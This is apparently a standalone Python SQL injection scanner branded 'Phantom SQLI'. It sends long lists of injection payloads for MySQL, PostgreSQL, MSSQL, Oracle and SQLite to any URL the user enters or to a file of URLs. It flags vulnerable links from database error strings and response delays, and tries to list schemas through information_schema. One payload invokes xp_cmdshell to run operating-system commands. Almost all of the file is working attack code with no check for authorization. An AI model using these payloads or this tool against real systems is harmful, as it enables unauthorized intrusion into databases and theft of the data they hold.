import requests
import re
import time
import os

RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

payloads = {
    "MySQL": [
        "' OR 1=1 -- ",
        "' OR 'a'='a",
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "' OR 1=1 LIMIT 1 OFFSET 1 --",
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--",
        "waitfor delay '0:0:10'--",
        ";waitfor delay '0:0:10'--",
        ");waitfor delay '0:0:10'--",
        "';waitfor delay '0:0:10'--",
        "\";waitfor delay '0:0:10'--\"",
        "'));waitfor delay '0:0:10'--",
        "')));waitfor delay '0:0:10'--",
        "';%5waitfor%5delay%5'0:0:10'%5--%5",
        "' WAITFOR DELAY '0:0:10'--",
        "' WAITFOR DELAY '0:0:10'",
        "or WAITFOR DELAY '0:0:10'--",
        "or WAITFOR DELAY '0:0:10'",
        "and WAITFOR DELAY '0:0:10'--",
        "and WAITFOR DELAY '0:0:10'",
        "WAITFOR DELAY '0:0:10'",
        ";WAITFOR DELAY '0:0:10'--",
        ";WAITFOR DELAY '0:0:10'",
        "1 WAITFOR DELAY '0:0:10'--",
        "1 WAITFOR DELAY '0:0:10'",
        "1 WAITFOR DELAY '0:0:10'-- 1337",
        "1' WAITFOR DELAY '0:0:10' AND '1337'='1337'",
        "1') WAITFOR DELAY '0:0:10' AND ('1337'='1337'",
        "1) WAITFOR DELAY '0:0:10' AND (1337=1337",
        "' WAITFOR DELAY '0:0:10'--",
        "\" WAITFOR DELAY '0:0:10'--\"",
        "')) WAITFOR DELAY '0:0:10'--",
        "'))) WAITFOR DELAY '0:0:10'--",
        "%' WAITFOR DELAY '0:0:10'--",
        "\")) WAITFOR DELAY '0:0:10'--\"",
        "\"))) WAITFOR DELAY '0:0:10'--\"",
        "1 waitfor delay '0:0:10'--",
        "1' waitfor delay '0:0:10'--",
        "1 and sleep(10)--",
        "1 and sleep(10)",
        "1 and sleep(10)--",
        "1 and sleep(10)",
        "' and sleep(10)--",
        "' and sleep(10)",
        "' and sleep(10) and '1'='1'",
        "' and sleep(10) and '1'='1'",
        "' and sleep(10)--",
        "' and sleep(10)",
        "' AnD SLEEP(10) ANd '1'",
        "and sleep(10)--",
        "and sleep(10)",
        "and sleep(10)--",
        "and sleep(10)",
        "and SELECT SLEEP(10); #",
        "AnD SLEEP(10)",
        "AnD SLEEP(10)--",
        "AnD SLEEP(10)#",
        "' AND SLEEP(10)#",
        "\" AND SLEEP(10)#\"",
        "') AND SLEEP(10)#",
        "')) or sleep(10)='",
        "\" or sleep(10)#\"",
        "1) or sleep(10)#",
        "')) or sleep(10)='",
        "or sleep(10)='",
        "\")) or sleep(10)=\"",
        "or sleep(10)='",
        "') or sleep(10)='",
        "1 OR sleep(10)#1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)",
        "1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (1337=1337",
        "' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337'='1337'",
        "') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ('PBiy'='PBiy'",
        "') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (1337=1337",
        "')) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (((1337=1337",
        "1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)# 1337",
        "') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "+(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY))+ ",
        "')) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "') AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "`=`1` AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND `1`=`1",
        "]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY))|[1",
        "') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "\" AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ('1337'='1337'",
        "')) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ((('1337'='1337'",
        "')) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ((('1337' LIKE '1337'",
        "%' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337%'='1337'",
        "' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337' LIKE '1337'",
        "\" AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (\"1337\"=\"1337\"",
        "')) AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND ((\"1337\"=\"1337\"",
        "\" AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND \"1337\" LIKE \"1337\"",
        "') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) OR '1337'='1337'",
        ") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "\" WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "' WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "\" WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "'||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))||'",
        "'+(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10)))+'",
        "1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (1337=1337",
        "' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337'='1337'",
        "' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "') AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337",
        "') OR 1=1--",
        "' OR 1=1--",
        "' OR '1'='1'--",
        "' OR '1'='1' AND SLEEP(10)--",
        "\" OR '1'='1'--\"",
        "\" OR '1'='1'--\"",
        "' OR '1'='1'--",
        "\" OR '1'='1' AND SLEEP(10)--\"",
        "\" OR '1'='1' AND SLEEP(10)--\"",
        "' OR 1=1--",
        "\" OR 1=1--\"",
    ],
    "PostgreSQL": [
        "'; SELECT version(); --",
        "' UNION SELECT NULL, table_name FROM information_schema.tables--",
        "' OR 1=1; --",
        "' UNION SELECT 1, pg_sleep(5)--",
        "' AND 1=1; --",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, current_user--",
        "' OR '1'='1'--",
        "' AND pg_sleep(5)--",
        "' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='public'--",
        "' OR EXISTS(SELECT 1 FROM pg_tables WHERE tablename='users')--",
        "' OR 1=1 LIMIT 1 OFFSET 1--",
        "' UNION SELECT NULL, pg_stat_activity.pid FROM pg_stat_activity--",
        "' AND (SELECT 1 FROM pg_roles WHERE rolname='postgres')--",
        "' AND 1=1;--",
        "' OR 1=1 LIMIT 1--",
        "' UNION SELECT NULL, table_schema FROM information_schema.tables--",
        "' UNION SELECT NULL, version()--",
        "' OR (SELECT COUNT(*) FROM pg_tables WHERE tablename='users') > 0--",
        "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
        "' AND EXISTS (SELECT 1 FROM pg_roles WHERE rolname='postgres')--",
        "' UNION SELECT NULL, pg_current_setting('version')--",
        "' OR pg_sleep(5)--",
        "' UNION SELECT NULL, 1/0--",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
        "' UNION SELECT NULL, pg_user.usename FROM pg_user--",
        "' OR (SELECT COUNT(*) FROM pg_stat_activity) > 0--",
        "' UNION SELECT NULL, current_database()--",
        "' AND (SELECT COUNT(*) FROM pg_tables) > 0--",
        "' OR EXISTS (SELECT 1 FROM pg_class WHERE relname='users')--",
        "' UNION SELECT NULL, pg_catalog.pg_get_userbyid(1)--",
        "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 0--",
        "' OR (SELECT 1 FROM pg_roles WHERE rolname='postgres')--",
        "' UNION SELECT NULL, pg_user.usename FROM pg_user WHERE usesuper=true--",
        "' AND (SELECT COUNT(*) FROM pg_stat_activity) > 0--",
        "' OR (SELECT 1 FROM pg_roles WHERE rolname='postgres')--",
        "' UNION SELECT NULL, pg_stat_activity.query FROM pg_stat_activity--",
        "' AND pg_sleep(5)--",
        "' OR 1=1 LIMIT 1 OFFSET 0--",
        "' UNION SELECT NULL, pg_catalog.pg_table_size('users')--",
        "' AND (SELECT COUNT(*) FROM pg_stat_activity) > 0--",
        "' OR EXISTS (SELECT 1 FROM pg_class WHERE relname='users')--",
        "' UNION SELECT NULL, pg_current_timestamp--",
        "' AND (SELECT COUNT(*) FROM pg_roles) > 0--",
        "' OR (SELECT 1 FROM pg_user WHERE usename='postgres')--",
        "' UNION SELECT NULL, pg_stat_activity.query FROM pg_stat_activity--",
        "' AND (SELECT COUNT(*) FROM pg_class) > 0--",
        "' OR (SELECT COUNT(*) FROM pg_tables WHERE tablename='users') > 0--",
        "' UNION SELECT NULL, pg_settings.setting FROM pg_settings--"
    ],
    "MSSQL": [
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1; --",
        "' UNION ALL SELECT @@version, NULL, NULL--",
        "'; WAITFOR DELAY '0:0:5'; --",
    ],
    "Oracle": [
        "' OR 'x'='x'",
        "' UNION SELECT NULL FROM DUAL--",
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NULL--",
        "' OR 1=1 --",
        "' UNION SELECT 1, 2 FROM DUAL--",
        "' AND 1=1--",
        "' UNION SELECT USER(), NULL FROM DUAL--",
        "' UNION SELECT banner, NULL FROM v$version--",
        "' AND 1=2 UNION SELECT NULL, NULL FROM all_users--",
        "' OR EXISTS (SELECT 1 FROM dual WHERE LENGTH(user) > 0)--",
        "' UNION SELECT NULL, object_name FROM all_objects WHERE rownum = 1--",
        "' OR (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS') > 0--",
        "' UNION SELECT NULL, table_name FROM all_tables WHERE ROWNUM = 1--",
        "' AND 1=2 UNION ALL SELECT NULL, dbms_metadata.get_ddl('TABLE', 'USERS') FROM DUAL--",
        "' OR 1=1 UNION ALL SELECT NULL, dbms_utility.get_parameter_value('oracle.version') FROM DUAL--",
        "' UNION ALL SELECT NULL, dbms_metadata.get_ddl('TABLE', table_name) FROM all_tables WHERE ROWNUM = 1--",
        "' OR EXISTS (SELECT 1 FROM dual WHERE (SELECT COUNT(*) FROM all_tables) > 1)--",
        "' UNION SELECT NULL, (SELECT group_concat(table_name) FROM all_tables) FROM DUAL--",
        "' OR (SELECT COUNT(*) FROM all_users WHERE username LIKE 'SYS%') > 0--",
        "' UNION SELECT NULL, (SELECT object_name FROM all_objects WHERE object_type='TABLE' AND ROWNUM = 1) FROM DUAL--",
        "' OR EXISTS (SELECT 1 FROM all_tables WHERE table_name='SYS.USER$')--",
        "' UNION SELECT NULL, (SELECT privilege FROM SESSION_PRIVS) FROM DUAL--",
        "' OR (SELECT COUNT(*) FROM all_views WHERE view_name LIKE '%USER%') > 0--",
        "' UNION ALL SELECT NULL, (SELECT dbms_stats.get_table_stats('SYS','USER$')) FROM DUAL--",
        "' OR (SELECT COUNT(*) FROM all_objects WHERE object_type='TABLE') > 10--",
        "' UNION ALL SELECT NULL, (SELECT dbms_utility.get_parameter_value('oracle.threads')) FROM DUAL--",
        "' OR 1=1 UNION ALL SELECT NULL, (SELECT object_name FROM all_objects WHERE object_type='TABLE' AND ROWNUM = 1) FROM DUAL--",
        "' UNION ALL SELECT NULL, (SELECT dbms_metadata.get_ddl('TABLE', table_name) FROM all_tables WHERE ROWNUM = 1) FROM DUAL--",
        "' OR (SELECT COUNT(*) FROM all_tables WHERE table_name LIKE '%EMP%') > 0--",
        "' UNION ALL SELECT NULL, (SELECT dbms_metadata.get_ddl('TABLE', 'USERS') FROM DUAL)--",
        "' OR EXISTS (SELECT 1 FROM all_tables WHERE table_name='PRODUCTS')--",
        "' UNION ALL SELECT NULL, (SELECT group_concat(column_name) FROM all_tab_columns WHERE table_name='USERS') FROM DUAL--",
        "' OR (SELECT COUNT(*) FROM v$session WHERE username IS NOT NULL) > 0--",
        "' UNION ALL SELECT NULL, (SELECT dbms_metadata.get_ddl('VIEW', view_name) FROM all_views WHERE ROWNUM = 1) FROM DUAL--"
    ],
    "SQLite": [
        "' OR 1=1 --",
        "' UNION SELECT NULL --",
        "' AND sqlite_version() = '3.8.3' --",
        "' OR 'a'='a --",
        "' UNION SELECT 1, sqlite_version() --",
        "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --",
        "' UNION SELECT NULL, NULL, NULL --",
        "' OR EXISTS (SELECT 1 FROM sqlite_master WHERE type='table') --",
        "' UNION SELECT NULL, group_concat(name) FROM sqlite_master WHERE type='table' --",
        "' AND 1=2 UNION SELECT NULL, sqlite_version() --",
        "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table') > 0 --",
        "' OR (SELECT 1 FROM sqlite_master WHERE name='users') --",
        "' UNION SELECT NULL, NULL, NULL FROM sqlite_master --",
        "' UNION SELECT 1, (SELECT group_concat(sql) FROM sqlite_master WHERE type='table') --",
        "' OR (SELECT name FROM sqlite_master WHERE type='table') LIKE '%users%' --",
        "' UNION SELECT NULL, (SELECT name FROM sqlite_master WHERE type='table') --",
        "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='table') > 1 --",
        "' UNION SELECT NULL, (SELECT group_concat(name) FROM sqlite_master WHERE type='table') --",
        "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table') > 0 --",
        "' OR (SELECT sql FROM sqlite_master WHERE name='users') --",
        "' UNION SELECT NULL, (SELECT sql FROM sqlite_master WHERE name='users') --",
        "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='index') > 0 --",
        "' UNION SELECT NULL, (SELECT sql FROM sqlite_master WHERE type='index') --",
        "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='view') > 0 --",
        "' UNION SELECT NULL, (SELECT name FROM sqlite_master WHERE type='view') --",
        "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='view') > 0 --",
        "' UNION SELECT NULL, (SELECT sql FROM sqlite_master WHERE type='view') --",
        "' OR EXISTS (SELECT 1 FROM sqlite_master WHERE name='users' AND type='table') --",
        "' UNION SELECT NULL, (SELECT group_concat(name) FROM sqlite_master WHERE type='index') --",
        "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='trigger') > 0 --",
        "' UNION SELECT NULL, (SELECT name FROM sqlite_master WHERE type='trigger') --",
        "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='trigger') > 0 --",
        "' UNION SELECT NULL, (SELECT sql FROM sqlite_master WHERE type='trigger') --",
        "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table') = 0 --",
        "' UNION SELECT NULL, (SELECT group_concat(name) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0) --",
        "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='view') = 0 --",
        "' UNION SELECT NULL, (SELECT sql FROM sqlite_master WHERE type='view' LIMIT 1 OFFSET 0) --",
        "' OR (SELECT COUNT(*) FROM sqlite_master WHERE type='index') = 0 --",
        "' UNION SELECT NULL, (SELECT group_concat(sql) FROM sqlite_master WHERE type='index') --"
    ]
}

db_errors = {
    'MySQL': ["you have an error in your sql syntax", "warning: mysql"],
    'PostgreSQL': ["pg_query", "pg_exec", "supplied argument is not a valid postgresql result"],
    'MSSQL': ["unclosed quotation mark after the character string", "microsoft odbc sql server driver"],
    'Oracle': ["quoted string not properly terminated", "ora-00933", "ora-00904", "ora-00907", "ora-01756"],
    'SQLite': ["sqlite error", "sql logic error or missing database"],
}

os.system('clear')

ascii_art = """
 _______   __                              __                                     ______    ______   __        ______
/       \ /  |                            /  |                                   /      \  /      \ /  |      /      |
$$$$$$$  |$$ |____    ______   _______   _$$ |_     ______   _____  ____        /$$$$$$  |/$$$$$$  |$$ |      $$$$$$/
$$ |__$$ |$$      \  /      \ /       \ / $$   |   /      \ /     \/    \       $$ \__$$/ $$ |  $$ |$$ |        $$ |
$$    $$/ $$$$$$$  | $$$$$$  |$$$$$$$  |$$$$$$/   /$$$$$$  |$$$$$$ $$$$  |      $$      \ $$ |  $$ |$$ |        $$ |
$$$$$$$/  $$ |  $$ | /    $$ |$$ |  $$ |  $$ | __ $$ |  $$ |$$ | $$ | $$ |       $$$$$$  |$$ |_ $$ |$$ |        $$ |
$$ |      $$ |  $$ |/$$$$$$$ |$$ |  $$ |  $$ |/  |$$ \__$$ |$$ | $$ | $$ |      /  \__$$ |$$ / \$$ |$$ |_____  _$$ |_
$$ |      $$ |  $$ |$$    $$ |$$ |  $$ |  $$  $$/ $$    $$/ $$ | $$ | $$ |      $$    $$/ $$ $$ $$< $$       |/ $$   |
$$/       $$/   $$/  $$$$$$$/ $$/   $$/    $$$$/   $$$$$$/  $$/  $$/  $$/        $$$$$$/   $$$$$$  |$$$$$$$$/ $$$$$$/
                                                                                               $$$/
"""

print(ascii_art)

ascii_art = """
 ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝
██║     ██║   ██║██║  ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝
██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝
╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝    ██████╔╝   ██║
 ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝    ╚═╝

███╗   ██╗██╗███████╗██████╗ ██████╗  █████╗  █████╗  █████╗
████╗  ██║██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██╔██╗ ██║██║█████╗  ██║  ██║██████╔╝███████║███████║███████║
██║╚██╗██║██║██╔══╝  ██║  ██║██╔══██╗██╔══██║██╔══██║██╔══██║
██║ ╚████║██║███████╗██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
╚═╝  ╚═══╝╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

"""

print(ascii_art)


def detect_db_vulnerability(response_text):
    for db, errors in db_errors.items():
        for error in errors:
            if error in response_text.lower():
                return db
    return None

def get_mysql_databases(url):
    db_list = []
    payloads = [
        "' UNION SELECT NULL, schema_name FROM information_schema.schemata--",
        "' UNION SELECT NULL, table_schema FROM information_schema.tables--",
        "' UNION SELECT NULL, table_name FROM information_schema.tables--",
        "' UNION SELECT NULL, column_name FROM information_schema.columns--",
        "' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = database()--",
        "' UNION SELECT NULL, database()--"
    ]
    for payload in payloads:
        full_url = f"{url}{payload}"
        try:
            response = requests.get(full_url, timeout=10)
            if "information_schema" in response.text.lower():
                print(f"{GREEN}[MYSQL DATABASES FOUND]{RESET} {BOLD}Possible databases:{RESET}")
                matches = re.findall(r'([a-zA-Z0-9_]+)', response.text)
                db_list.extend(set(matches))
                print("\n".join(db_list))
                break
        except requests.exceptions.RequestException as e:
            print(f"{RED}[ERROR]{RESET} Request failed: {e}")
    if not db_list:
        print(f"{RED}[MYSQL DATABASES]{RESET} No databases found or the extraction failed.")

def test_sqli_time_based(url):
    time_payloads = [
        "' OR SLEEP(5)--",
        "' OR 'a'='a' AND SLEEP(5)--",
        "' OR 1=1 AND SLEEP(5)--",
        "' OR pg_sleep(5)--",
    ]
    for payload in time_payloads:
        start_time = time.time()
        full_url = f"{url}{payload}"
        try:
            response = requests.get(full_url, timeout=10)
            end_time = time.time()
            duration = end_time - start_time
            if duration > 5:
                print(f"{GREEN}[VULNERABLE]{RESET} {BOLD}Possible Time-Based SQL Injection found{RESET} with payload: {YELLOW}{payload}{RESET}")
                return full_url
        except requests.exceptions.RequestException as e:
            print(f"{RED}[ERROR]{RESET} Request failed: {e}")
    return None

def test_sqli(url):
    print(f"{BLUE}[INFO]{RESET} Testing SQL Injection on: {BOLD}{url}{RESET}\n")

    found_vulnerabilities = []
    for db, db_payloads in payloads.items():
        print(f"{YELLOW}[INFO]{RESET} Testing for {BOLD}{db}{RESET} payloads...\n")
        for payload in db_payloads:
            full_url = f"{url}{payload}"
            try:
                response = requests.get(full_url, timeout=10)
                db_type = detect_db_vulnerability(response.text)
                if db_type:
                    print(f"{GREEN}[VULNERABLE]{RESET} {BOLD}SQL Injection found{RESET} with payload: {YELLOW}{payload}{RESET} on {BOLD}{db_type}{RESET} database!")
                    print(f"{RED}[VULNERABILITY LINK]{RESET} {full_url}\n")
                    found_vulnerabilities.append((full_url, payload, db_type))
                else:
                    print(f"{RED}[SAFE]{RESET} No SQL Injection with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"{RED}[ERROR]{RESET} Request failed: {e}")

    time_vulnerability = test_sqli_time_based(url)
    if time_vulnerability:
        found_vulnerabilities.append((time_vulnerability, "Time-based payload", "Time-based"))

    if found_vulnerabilities:
        print(f"\n{GREEN}[RESULT]{RESET} {BOLD}SQL Injection vulnerabilities detected!{RESET}")
        for full_url, payload, db_type in found_vulnerabilities:
            print(f"{GREEN}[FOUND]{RESET} Payload: {YELLOW}{payload}{RESET} | Database: {BOLD}{db_type}{RESET}")
            print(f"{RED}[VULNERABILITY LINK]{RESET} {full_url}\n")
    else:
        print(f"\n{YELLOW}[RESULT]{RESET} No SQL Injection vulnerability found for the given URL.")

    print(f"\n{BLUE}[INFO]{RESET} Testing for MySQL databases...\n")
    get_mysql_databases(url)

    print(f"\n{BLUE}[SUMMARY]{RESET}")
    print(f"{BOLD}Total vulnerabilities found:{RESET} {len(found_vulnerabilities)}")
    if found_vulnerabilities:
        print(f"\n{BOLD}List of vulnerable links:{RESET}")
        for full_url, _, _ in found_vulnerabilities:
            print(f"- {full_url}")

def process_urls(urls):
    for url in urls:
        url = url.strip()
        if url:
            test_sqli(url)

def main():

    choice = input(f"{BOLD}{CYAN}Do you want to test a single URL (1) or multiple URLs from a file (2)? Enter 1 or 2: {RESET}")

    if choice == "1":
        url = input(f"{BOLD}{CYAN}Enter the target URL (e.g., http://example.com/page.php?id=): {RESET}")
        if not url.startswith("http"):
            print(f"{RED}[ERROR]{RESET} Please enter a valid URL.")
            return
        test_sqli(url)
    elif choice == "2":
        filename = input(f"{BOLD}{CYAN}Enter the path to the file containing URLs: {RESET}")
        try:
            with open(filename, 'r') as file:
                urls = file.readlines()
                process_urls(urls)
        except FileNotFoundError:
            print(f"{RED}[ERROR]{RESET} File not found. Please check the file path.")
    else:
        print(f"{RED}[ERROR]{RESET} Invalid choice. Please enter 1 or 2.")

if __name__ == "__main__":
    main()
